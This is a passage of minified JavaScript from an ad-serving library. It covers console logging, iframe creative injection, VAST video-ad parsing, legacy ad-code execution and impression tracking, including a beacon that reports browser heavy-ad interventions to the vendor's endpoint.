          return (e || "").search(t) > -1;
        })), r && !n;
      },
      _getExecutionLine: function (e) {
        var t = "";
        if (!i.default.isChrome() && !i.default.isSafari()) return "";
        try {
          throw new Error();
        } catch (a) {
          for (var r = a.stack.replace("Error\n", "").replace(/    at /g, "-> ").split("\n"); c._isInternalFn(r[0]);) r.shift();
          if (i.default.isChrome()) {
            if (e) t = r.join("\n");else if (r[0]) {
              var n = r[0].match(/\s\(.*\)/);
              t = n ? n[0] ? n[0] : "" : "(" + r[0].replace("-> ", "") + ")";
            }
          } else if (e) t = r.join("\n");else if (r[0]) {
            var o = r[0].match(/\@(.*)/);
            t = o ? o[0] ? o[0] : "" : "@" + r[0];
          }
        }
        return t;
      },
      _isInternalFn: function (e) {
        return !!["_getExecutionLine", "log", "info", "warn", "error"].find(function (t) {
          return e.search(function (e) {
            return i.default.isChrome() ? "." + e : i.default.isSafari() ? e + "@" : e;
          }(t)) > -1;
        });
      },
      _saveFilters: function () {
        var e = c._filters;
        n.default.save("JHelperLogger#_filters.include", e.include), n.default.save("JHelperLogger#_filters.exclude", e.exclude);
      },
      alwaysLog: function (e, t, r) {
        var n = c._debug;
        c._debug = !0, c[e](t, r), c._debug = n;
      },
      log: function (e, t) {
        if (c._debug) {
          var r = "padding: 2px; background: rgba(0, 0, 0, 0.5); color: rgba(255, 255, 255, 1);";
          if (c._filter(e)) {
            var n = c._getExecutionLine();
            t = t || "", "String" === a.default.getType(e) ? console.log("%c(" + o.default.format(o.default.now()) + ")%c" + e, r, t) : console.log("%c(" + o.default.format(o.default.now()) + ")%c" + a.default.getType(e), r, t, e), n.length && console.log(n);
          }
        }
      },
      warn: function (e) {
        return c.log(e, "padding: 2px; background: rgba(255, 153, 0, 0.3); color: rgba(255, 153, 0, 1);"), this;
      },
      info: function (e) {
        return c.log(e, "padding: 2px; background: rgba( 0, 153, 204, 0.3); color: rgba( 0, 153, 204, 1);"), this;
      },
      error: function (e) {
        return c.log(e, "padding: 2px; background: rgba(255, 0, 0, 0.3); color: rgba(255, 0, 0, 1);"), this;
      },
      table: function (e) {
        if (c._debug) return console.table ? console.table(e) : c.log(e), this;
      },
      debug: function (e) {
        c._debug = !!e;
      },
      filterInclude: function (e) {
        c._filters.include.push(e), c._saveFilters();
      },
      filterExclude: function (e) {
        c._filters.exclude.push(e), c._saveFilters();
      },
      clear: function () {
        c._filters.exclude.length = 0, c._filters.include.length = 0, c._saveFilters();
      }
    };
    c.debug(!1), t.default = c;
  },
  18: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = c(r(4)),
      o = c(r(2)),
      i = c(r(1)),
      a = c(r(86)),
      s = c(r(46));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function l(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var d = new WeakMap(),
      u = i.default.getTopScope(),
      p = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n;
          return o._setPrivates(r), o._bindEvents(), n;
        }
        return l(t, e), t.prototype._bindEvents = function () {
          var e = d.get(this);
          this.whenReady("jProduct").then(function (t) {
            t.subscribe("afterShow", function (t) {
              e.productShow = !0;
            }), t.subscribe("afterDestroy", function () {
              if (e.players) {
                var t = e.players;
                for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && (t[r].mute(), t[r] = null);
              }
            });
          });
        }, t.prototype._setPrivates = function (e) {
          e = e || {};
          var t = {};
          return t.di = e.di || {}, u[this.getId()] = this, d.set(this, t), t.productShow = !1, t.counter = 0, t.players = {}, t.sources = [], t.jclScope = {}, t;
        }, t.prototype._loadJcl = function (e, t) {
          var r = this,
            n = d.get(r),
            o = n.di,
            i = o.jModel && o.jModel.getData() || {},
            a = e.format || i.format,
            s = e.layer,
            c = e.height,
            l = e.width,
            p = e.responsive,
            f = e.h,
            h = e.b,
            g = e.f;
          if (void 0 === a) throw new Error("Format not found.");
          ("ci" === a || "fi" === a || "hi" === a || "ms" === a || "mt" === a || "wp" === a && "top" === s) && (p = !0);
          var v = void 0;
          if ((v = t.jpx_ad_config ? t.jpx_ad_config : o.jModel.getData("config")) && v.layout && v.layout.responsive && (p = !0), "cf" === a && !p) {
            var m = new Error("Classic Floorad should be always responsive. Passed params " + JSON.stringify({
              responsive: e.responsive,
              format: e.format,
              height: e.height
            }));
            m.code = 401, r.publish("apiExecError", [m, o.jModel || {}]);
          }
          var y = document.createElement("iframe");
          y.scrolling = "no", y.style.border = "0px", y.style.display = "block", y.style.scrolling = "no", y.width = p ? "100%" : l, y.height = p ? "100%" : c, "is" === a ? (y.style.width = p ? "100vw" : l + "px", y.style.height = p ? "100vh" : c + "px") : (y.style.width = p ? "100%" : l + "px", y.style.height = p ? "100%" : c + "px");
          var b = void 0;
          if ("wp" === a && s) {
            var w = void 0;
            b = "jcl-wrapper jcl-" + a + "-" + s, "global" === s ? t.window.document.body.appendChild(y) : (w = "jpx-wp-layer-" + s, (t = i.isDfp ? window.document.getElementById(w) : u.document.getElementById(w)).appendChild(y));
          } else b = "jcl-wrapper jcl-" + a, t.document.body.appendChild(y);
          y.className = b;
          var _ = "<script>let currWindow;try{currWindow = window.top;let test = currWindow.location.href;}catch (e) {currWindow = window;} var jpxApi = currWindow." + r.getId() + "; window.jpxOnReady = function (cb) {cb(jpxApi)};<\/script>";
          f = f.replace("</head>", ' <script> function sendReports(e) { e.forEach(function (e) { var i; "HeavyAdIntervention" === e.body.id && jpxApi && jpxApi.getCreativeID && jpxApi.getFormat && jpxApi.geo && jpxApi.getRid && jpxApi.getZid && (i = JSON.stringify({ cid: jpxApi.getCreativeID() || null, id: e.body.id || null, fc: [jpxApi.getFormat()] || null, ic: jpxApi.geo().isocode || null, rid: jpxApi.getRid() || null, zid: jpxApi.getZid() || null, }), navigator.sendBeacon("https://pre.ads.justpremium.com/v/1.0/t/report",i))})}try{var obs=new ReportingObserver(function(e,i){sendReports(e)},{buffered:!0});obs.observe()}catch(e){} <\/script> ' + _ + "</head>");
          var j = i.trackingEvents;
          if (j && j.attnUrl) {
            var E = j.attnUrl,
              x = "mt" === a ? h.includes("body_main") ? "main" : "bottom" : s,
              O = '<script type="text/javascript" src=' + E.replace(/\[layerName\]/, x) + "><\/script>";
            h = h.replace(/(<\/body\s*>)/i, O + "$1");
          }
          var P = f + h + g;
          s && "global" !== s && (y.onload = function () {
            r.publish(s + "AfterFrameWrite", [r, y, o]);
          }), y.contentWindow.document.open(), y.contentWindow.document.write(P), y.contentWindow.document.close(), "wp" === a ? n.jclScope[s] = y.contentWindow : n.jclScope = y.contentWindow;
        }, t.prototype.addSheet = function (e) {
          var t = d.get(this);
          d.get(this).di.jDOM.createElement("stylesheet-api-" + t.counter++, {
            tag: "style",
            parent: "@head",
            attributes: {
              type: "text/css",
              class: "jpx-stylesheet"
            },
            properties: {
              content: "/* JPX custom stylesheet */ " + e
            }
          });
        }, t.prototype.autoplay = function (e) {
          var t = d.get(this).di;
          if (void 0 === e || "boolean" != typeof e) throw new Error("The specified parameter is empty.\n");
          t.jModel.addProperty("autoplay", e);
        }, t.prototype.clearInit = function (e) {
          if (!e || -1 === e || void 0 == e || "function" != typeof e) throw new Error("The function is empty.\n");
          this.whenReady("jProduct").then(function (t) {
            t.subscribe("afterDestroy", e);
          });
        }, t.prototype.close = function () {
          var e = this,
            t = d.get(e),
            r = t.di.jProduct;
          t.productShow ? (e.track("click", "close", !0), r.hide()) : e.whenReady("jProduct").then(function (t) {
            t.subscribe("afterShow", function (t) {
              e.track("click", "close", !0), r.hide();
            });
          });
        }, t.prototype.createVideo = function (e, t, r) {
          var n = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3],
            o = d.get(this);
          t && (o.di.jProductApi = this, this.whenReady("jProduct").then(function () {
            o.players[e] = a.default.createVideo(o, t, r, e, n), o.sources && o.sources.push(r);
          }));
        }, t.prototype.geo = function () {
          var e = d.get(this).di;
          if (e.jTracking) return e.jTracking.geo();
        }, t.prototype.getRid = function () {
          return d.get(this).di.jModel.getData("reqId");
        }, t.prototype.getZid = function () {
          return d.get(this).di.jModel.getData("zoneId");
        }, t.prototype.getCreativeID = function () {
          var e = d.get(this).di,
            t = e.jModel && e.jModel.getData() || {};
          return t && t.creative && t.creative.creativeId ? t.creative.creativeId : s.default.getCreativeId(this.getInnerScope().document.documentElement.innerHTML);
        }, t.prototype.getFormat = function () {
          return d.get(this).di.jModel.getFormat();
        }, t.prototype.getInnerScope = function () {
          var e = d.get(this).di;
          return e.localWindow || e.window;
        }, t.prototype.isMobile = function () {
          return i.default.isMobile();
        }, t.prototype.loadJcl = function (e, t) {
          var r = d.get(this).di;
          try {
            this._loadJcl(e, t);
          } catch (e) {
            e.code = 403, this.publish("apiExecError", [e, r && r.jModel || {}]);
          }
        }, t.prototype.onNativeEvent = function (e, t) {
          if (!e) throw new Error("The state provided is empty.\n");
          if (!t || -1 === t || void 0 == t || "function" != typeof t) throw new Error("The function is empty.\n");
          u.addEventListener(e, t);
        }, t.prototype.returnSiteWidth = function () {
          var e = d.get(this).di;
          return (e.jModel && e.jModel.getData() || {}).site.width;
        }, t.prototype.setDependency = function (e, t) {
          return d.get(this).di[e] = t, this.publish(e + "DependencySet", [t]), this;
        }, t.prototype.setHeight = function (e, t) {
          var r = d.get(this).di;
          if (!e || !t) throw new Error("The specified size or unit is empty.");
          var n = {
            size: e,
            unit: t
          };
          r.jModel.addProperty("setHeight", n);
        }, t.prototype.setSiteWidth = function (e) {
          var t = d.get(this).di,
            r = t.jModel;
          t.jExecution.subscribe("adFrameReady", function () {
            r.addProperty("site.width", e);
          });
        }, t.prototype.videoEvent = function (e, t, r) {
          var n = d.get(this);
          this.whenReady("jProduct").then(function () {
            n.players[t] && n.players[t].subscribe(e, r);
          });
        }, t.prototype.track = function (e, t) {
          var r = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
            n = d.get(this).di.jTracking;
          n && n.initCustomTracking(e, t, r);
        }, t.prototype.whenReady = function (e) {
          var t = this,
            r = d.get(t).di;
          return {
            then: function (n) {
              var i = void 0,
                a = new Promise(function (e) {
                  i = e;
                }),
                s = r[e];
              if (s) {
                var c = n(s);
                return o.default.delay(t, function () {
                  i(c);
                }), a;
              }
              return t.subscribe(e + "DependencySet", function () {
                i(n(r[e]));
              }), a;
            }
          };
        }, t;
      }(n.default);
    t.default = p;
  },
  19: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(4)),
      o = a(r(141)),
      i = a(r(1));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      l = new WeakMap(),
      d = new WeakMap(),
      u = i.default.getTopScope(),
      p = function (e) {
        function t(r, n) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var o = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            i = o;
          return l.set(i, {
            wrapper: null,
            click: null,
            videos: [],
            videosAttributes: [],
            types: [],
            resources: {
              jsResource: [],
              flashResource: [],
              viewableImpression: []
            },
            rawXML: ""
          }), d.set(i, {
            impressions: [],
            clickTracking: [],
            viewableImpression: {
              viewable: [],
              notViewable: [],
              viewUndetermined: []
            }
          }), i._setPrivates(r, n), o;
        }
        return s(t, e), t.prototype._setPrivates = function (e, t) {
          var r = {};
          r.request = this._resolveVast(e, t), c.set(this, r);
        }, t.prototype._resolveVast = function (e, t) {
          var r = this;
          return t ? Promise.resolve(r._loadFromJSON(t)) : o.default.get(e).ready().then(function (e) {
            return r._parseVast(e);
          });
        }, t.prototype._loadFromJSON = function (e) {
          return l.set(this, e.data), d.set(this, e.events), e;
        }, t.prototype._parseVast = function (e) {
          var t = this,
            r = t._parse(e),
            n = t._xml(r);
          if (l.get(t).rawXML = e, n.data && n.data.wrapper) return t._resolveVast(n.data.wrapper);
          if (!n.data) throw new Error("Loading Vast failed");
          return t._vastLoaded = !0, n.data;
        }, t.prototype._xml = function (e) {
          var t = e,
            r = l.get(this),
            n = d.get(this);
          if ("function" != typeof t.getElementsByTagName) return e;
          if (t.getElementsByTagName("MediaFile").length > 0 || t.getElementsByTagName("VASTAdTagURI").length > 0) {
            this._events(t, "xml");
            var o = t.getElementsByTagName("ClickThrough")[0],
              i = t.getElementsByTagName("VideoClicks")[0];
            if (void 0 !== o && (r.click = o.childNodes[0].nodeValue.trim(), r.originClick = o.childNodes[0].nodeValue.trim(), 0 === r.click.length && (r.click = o.childNodes[0].wholeText.trim(), r.originClick = o.childNodes[0].wholeText.trim())), void 0 !== i) {
              var a = i.getElementsByTagName("ClickTracking");
              if (void 0 !== a) for (var s = a.length; s--;) {
                var c = a[s].childNodes[0].nodeValue.trim();
                0 === c.length && (c = a[s].childNodes[0].wholeText.trim()), n.clickTracking.push(c);
              }
            }
            for (var u = t.getElementsByTagName("MediaFile").length, p = t.getElementsByTagName("MediaFile"), f = 0; f < u; f++) {
              var h = p[f].childNodes[0].nodeValue.trim();
              if (0 === h.length && (h = p[f].childNodes[0].wholeText.trim()), 1 === u && "flv" === h.split(".").pop()) return {};
              r.videos.push(h), r.types.push(p[f].getAttribute("type").trim()), r.videosAttributes.push({
                bitrate: parseInt(p[f].getAttribute("height")),
                height: parseInt(p[f].getAttribute("height")),
                width: parseInt(p[f].getAttribute("width"))
              });
            }
            var g = t.getElementsByTagName("Verification");
            if (g[0] && g[0].childNodes[0]) for (var v = 0; v < g.length; v++) {
              var m = g[v].getElementsByTagName("JavaScriptResource"),
                y = g[v].getElementsByTagName("FlashResource"),
                b = g[v].getElementsByTagName("ViewableImpression");
              if (m[0]) for (var w = 0; w < m.length; w++) r.resources.jsResource.push(m[w].childNodes[0].wholeText.trim());
              if (y[0]) for (var _ = 0; _ < y.length; _++) r.resources.flashResource.push(y[_].childNodes[0].wholeText.trim());
              if (b[0]) for (var j = 0; j < b.length; j++) r.resources.viewableImpression.push(b[j].childNodes[0].wholeText.trim());
            }
            return r.wrapper = this._getWrapperUrl(t), {
              data: r,
              events: n
            };
          }
          return {};
        }, t.prototype._events = function (e, t) {
          var r = d.get(this);
          switch (t) {
            case "json":
              var n = e.Ads[0].Creatives[0].Linear.TrackingEvents,
                o = e.Ads[0].Impression,
                i = void 0;
              for (i in n) n.hasOwnProperty(i) && (r[i] = n[i][0]);
              r.impressions = o;
              break;
            case "xml":
              var a = e.getElementsByTagName("TrackingEvents")[0],
                s = e.getElementsByTagName("Impression"),
                c = e.getElementsByTagName("ViewableImpression")[0];
              if (a) for (var l = a.childNodes.length, u = 0; u < l; u++) if (null === a.childNodes[u].nodeValue) {
                var p = a.childNodes[u].childNodes[0].nodeValue.trim();
                0 === p.length && (p = a.childNodes[u].childNodes[0].wholeText.trim()), r[a.childNodes[u].getAttribute("event")] || (r[a.childNodes[u].getAttribute("event")] = []), -1 == r[a.childNodes[u].getAttribute("event")].indexOf(p) && r[a.childNodes[u].getAttribute("event")].push(p);
              }
              if (s) for (var f = s.length, h = 0; h < f; h++) {
                var g = s[h].childNodes[0].nodeValue.trim();
                0 === g.length && (g = s[h].childNodes[0].wholeText.trim()), -1 == r.impressions.indexOf(g) && r.impressions.push(g);
              }
              if (c) {
                var v = e.getElementsByTagName("Viewable"),
                  m = e.getElementsByTagName("NotViewable"),
                  y = e.getElementsByTagName("ViewUndetermined");
                if (v) for (var b = 0; b < v.length; b++) r.viewableImpression.viewable.push(v[b].childNodes[0].wholeText.trim());
                if (m) for (var w = 0; w < m.length; w++) r.viewableImpression.notViewable.push(m[w].childNodes[0].wholeText.trim());
                if (y) for (var _ = 0; _ < y.length; _++) r.viewableImpression.viewUndetermined.push(y[_].childNodes[0].wholeText.trim());
              }
          }
          return r;
        }, t.prototype._getWrapperUrl = function (e) {
          var t = e.getElementsByTagName("VASTAdTagURI"),
            r = void 0;
          return void 0 !== t[0] && 0 === (r = (t = t[0]).childNodes[0].nodeValue.trim()).length && (r = t.childNodes[0].wholeText.trim()), r;
        }, t.prototype._parse = function (e) {
          try {
            e = JSON.parse(e);
          } catch (t) {
            if (u.DOMParser) e = new DOMParser().parseFromString(e, "text/xml");else (e = new ActiveXObject("Microsoft.XMLDOM")).async = !1, e.loadXML(e);
          }
          return e;
        }, t.prototype.getData = function (e) {
          var t = l.get(this);
          return function (e, t) {
            for (var r = void 0, n = t; r = e.shift();) {
              if (!n[r]) return null;
              n = n[r];
            }
            return n;
          }(e.split("."), t);
        }, t.prototype.getEvents = function (e) {
          var t = d.get(this);
          return function (e, t) {
            for (var r = void 0, n = t; r = e.shift();) {
              if (!n[r]) return [];
              n = n[r];
            }
            return n || [];
          }(e.split("."), t);
        }, t.prototype.getVast = function () {
          return {
            data: l.get(this),
            events: d.get(this)
          };
        }, t.prototype.getRawXml = function () {
          return l.get(this).rawXML;
        }, t.prototype.ready = function () {
          var e = l.get(this),
            t = d.get(this),
            r = c.get(this);
          return this._vastLoaded ? Promise.resolve({
            data: e,
            events: t
          }) : r.request;
        }, t.prototype.setScope = function (e) {
          _privates.get(this).di.scope = e;
        }, t.get = function (e, r) {
          return new t(e, r);
        }, t;
      }(n.default);
    t.default = p;
  },
  2: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = {
      objects: {},
      win: window,
      cancelAllInObj: function (e) {
        for (var t = e.getId(), r = n.objects[t], o = void 0; o = r.pop();) o.clear();
      },
      cancelAll: function () {
        Object.keys(n.objects).forEach(function (e) {
          for (var t = void 0; t = n.objects[e].pop();) t.clear();
        });
      },
      delay: function (e, t, r) {
        var o = e.getId(),
          i = n.objects[o] = n.objects[o] || function () {
            var e = [];
            return e.add = function (t) {
              var r = function () {
                var r = -1;
                e.find(function (e, n) {
                  e.id === t && (r = n);
                }), r > -1 && (e.splice(r, 1), n.win.clearTimeout(t));
              };
              return e.push({
                id: t,
                clear: r
              }), r;
            }, e;
          }(),
          a = void 0,
          s = void 0,
          c = new Promise(function (e, t) {
            a = e, s = t;
          }),
          l = i.add(n.win.setTimeout(function () {
            l();
            try {
              a(t ? t() : {});
            } catch (e) {
              s(e);
            }
          }, r || 0));
        return l.promise = function () {
          return c;
        }, l;
      },
      getObjectRunningTasks: function (e) {
        return n.objects[e.getId()] || [];
      },
      window: function (e) {
        function t(t) {
          return e.apply(this, arguments);
        }
        return t.toString = function () {
          return e.toString();
        }, t;
      }(function (e) {
        n.win = e || window;
      })
    };
    t.default = n;
  },
  20: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n]);
        }
        return e;
      },
      o = s(r(16)),
      i = s(r(13)),
      a = s(r(4));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function c(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var l = s(r(1)).default.getTopScope(),
      d = {
        beforeInit: {
          object: "jExecution",
          event: "beforeInit"
        },
        init: {
          object: "jExecution",
          event: "beforeFrameWrite"
        },
        afterInit: {
          object: "jExecution",
          event: "afterProductInit"
        },
        create: {
          object: "jExecution",
          event: "afterFrameWrite"
        },
        sanitize: {
          object: "jExecution",
          event: "afterProductCreate"
        },
        beforeMatch: {
          object: "jExecution",
          event: "adFrameReady"
        },
        match: {
          object: "jExecution",
          event: "afterProductRender"
        },
        beforeAdCall: {
          object: "jExecution",
          event: "beforeFrameWrite"
        },
        beforeRender: {
          object: "jAd",
          event: "afterProductRender"
        },
        hide: {
          object: "jProduct",
          event: "afterHide"
        },
        show: {
          object: "jProduct",
          event: "beforeShow"
        }
      },
      u = new WeakMap(),
      p = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n;
          r = r || {};
          var i = {};
          return i.di = r.di || {}, u.set(o, i), n;
        }
        return c(t, e), t.prototype.setDependency = function (e, t) {
          return u.get(this).di[e] = t, this.publish(e + "DependencySet", [t]), this;
        }, t.prototype.sandbox = function (e) {
          var t = this;
          t._scope || (t._scope = new function () {}(), t._extendScope(t._scope)), o.default.warn("JHelperCompatibilityAdapter: executing legacy code.");
          try {
            e = t._extendFnBody(e), new Function(e).apply(t._scope);
          } catch (r) {
            o.default.log(e), o.default.error(r), o.default.error(e), t.publish("initError", [r]);
          }
        }, t.prototype.whenReady = function (e) {
          var t = this,
            r = u.get(t).di,
            n = r[e];
          return {
            then: function (o) {
              if (n) return o(n);
              t.subscribe(e + "DependencySet", function () {
                o(r[e]);
              });
            }
          };
        }, t.prototype.oldAdDetected = function (e) {
          var t = l[l.jpx_template_id],
            r = t && t.format;
          return Array.isArray(e) || (e = [e]), e.indexOf(r) > -1;
        }, t.prototype._extendFnBody = function (e) {
          var t = u.get(this).di;
          return function () {
            var e = void 0;
            try {
              (e = window.top).location.href;
            } catch (t) {
              e = window;
            }
            var jpxApi = e.PRODUCTAPI_NAME || {};
            jpxApi.__x = jpxApi.getId();
          }.toString().replace("PRODUCTAPI_NAME", t.jProductApi.getId()).replace(/function\s*\(\)\s*\{?/i, "").slice(0, -1) + ";" + e;
        }, t.prototype._extendScope = function (e) {
          var t = this,
            r = u.get(t).di;
          t.whenReady("jModel").then(function () {
            e.format = r.jModel.getFormat();
          }), e.logger = o.default;
          var a = function (r, n, i, a) {
            r.subscribe(i, function () {
              try {
                a.apply(e);
              } catch (e) {
                throw o.default.error(e), o.default.error(a.toString()), t.error(902, {
                  event: n
                });
              }
            });
          };
          return e.addCallback = function (e, r) {
            try {
              var n = d[e],
                i = u.get(t).di,
                s = i[n.object];
              s ? a(s, e, n.event, r) : t.subscribe(n.object + "DependencySet", function () {
                var t = i[n.object];
                a(t, e, n.event, r);
              });
            } catch (e) {
              throw o.default.error(e), t.error(901);
            }
          }, e.fail = function (e) {}, e.product = function () {
            return {
              callback: {
                add: function (t, r) {
                  e.addCallback(t, r);
                }
              }
            };
          }, e.$_assign = function (e, t) {
            return n(e, t);
          }, l.jpx_template_id = t.getId(), l[l.jpx_template_id] = e, e.direction = "r" === i.default.direction(l.document.body) || "r" === i.default.direction(l.document.getElementsByTagName("html")[0]) ? "r" : null, e.$_helpers = {
            JHelperDOM: i.default
          }, t;
        }, t;
      }(a.default);
    t.default = p;
  },
  208: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }(r(1)).default.getTopScope(),
      o = {
        prefix: "jpx-",
        decode: function (e) {
          return JSON.parse(e);
        },
        encode: function (e) {
          return JSON.stringify(e);
        },
        read: function (e) {
          try {
            var t = n.localStorage;
            if (!t) return !1;
            var r = t.getItem(this.prefix + e);
            return !!r && (r = this.decode(r));
          } catch (e) {
            return !1;
          }
        },
        save: function (e, t) {
          try {
            var r = n.localStorage;
            return !!r && r.setItem(this.prefix + e, this.encode(t));
          } catch (e) {
            return !1;
          }
        }
      };
    t.default = o;
  },
  209: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(1));
    var o = {
      adCover: function (e) {
        return (e / (n.default.getWindowHeight() * n.default.getWindowWidth()) * 100).toFixed(2);
      },
      blockTrackingOnPreviewPage: function (e) {
        return !(!this.detectPreviewPage() || ["ex", "adr", "im", "sh", "cl", "err", "bim", "bsh", "berr", "eex", "eadr", "eim", "esh", "eerr "].includes(e));
      },
      detectPreviewPage: function () {
        var e = window.top.location,
          t = e.hostname.indexOf("displayvideo.google.com") > -1,
          r = e.pathname.search("doubleclick/preview") > 0;
        return t && r;
      }
    };
    t.default = o;
  },
  21: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = a(r(23)),
      o = a(r(16)),
      i = a(r(33));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      l = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            o = n,
            i = {};
          return c.set(o, i), i.di = r.di, i.trackingDisabled = !1, i.isCustomApiVideo = !1, r.options && (i.trackingDisabled = r.options.disableTracking, i.isCustomApiVideo = r.options.isCustomApiVideo), o._setPrefix(i.layer), o._bindEvents(), n;
        }
        return s(t, e), t.prototype._bindEvents = function () {
          var e = c.get(this).di.jDOM;
          this._promises.push(new Promise(function (t) {
            e.subscribe("afterRender", function () {
              t();
            });
          }));
        }, t.prototype._bindVastSources = function () {
          var e = this.getPrefix(),
            t = c.get(this).di,
            r = this.getId(),
            n = t.jModel,
            o = t.jDOM;
          t.jProductApi ? this._getBestVideoSources().forEach(function (t, n) {
            o.createElement(e + "source-" + n + "-" + r, {
              tag: "source",
              parent: e + "container-" + r,
              attributes: {
                src: t.src,
                type: t.types
              }
            });
          }) : n.getData("videos").forEach(function (t, i) {
            o.createElement(e + "source-" + i + "-" + r, {
              tag: "source",
              parent: e + "container-" + r,
              attributes: {
                src: t,
                type: n.getData("types")[i]
              }
            });
          });
        }, t.prototype._bindVastEvents = function () {
          var e = this,
            t = c.get(e),
            r = t.di.jModel,
            n = i.default.instance();
          t.isCustomApiVideo || n && !t.trackingDisabled && (e.subscribe("viewable", function () {
            r.getEvents("viewableImpression.viewable").forEach(function (e, t) {
              n.externalTrack("Vast:viewableImpression:viewable:" + (t + 1), e);
            });
          }), e.subscribe("notViewable", function () {
            r.getEvents("viewableImpression.notViewable").forEach(function (e, t) {
              n.externalTrack("Vast:viewableImpression:notViewable:" + (t + 1), e);
            });
          }), e.subscribe("viewUndetermined", function () {
            r.getEvents("viewableImpression.viewUndetermined").forEach(function (e, t) {
              n.externalTrack("Vast:viewableImpression:viewUndetermined:" + (t + 1), e);
            });
          }), r.getEvents("impressions").forEach(function (e, t) {
            n.externalTrack("Vast:impressions:" + (t + 1), e);
          }), r.getEvents("creativeView").forEach(function (e, t) {
            n.externalTrack("Vast:creativeView:" + (t + 1), e);
          }), e.subscribe("start", function () {
            r.getEvents("start").forEach(function (e, t) {
              n.externalTrack("Vast:start:" + (t + 1), e);
            });
          }), e.subscribe("pause", function () {
            r.getEvents("pause").forEach(function (e, t) {
              n.externalTrack("Vast:pause:" + (t + 1), e);
            });
          }), e.subscribe("resume", function () {
            r.getEvents("resume").forEach(function (e, t) {
              n.externalTrack("Vast:resume:" + (t + 1), e);
            });
          }), e.subscribe("complete", function () {
            r.getEvents("complete").forEach(function (e, t) {
              n.externalTrack("Vast:ended:" + (t + 1), e);
            });
          }), e.subscribe("mute", function () {
            r.getEvents("mute").forEach(function (e, t) {
              n.externalTrack("Vast:mute:" + (t + 1), e);
            });
          }), e.subscribe("unmute", function () {
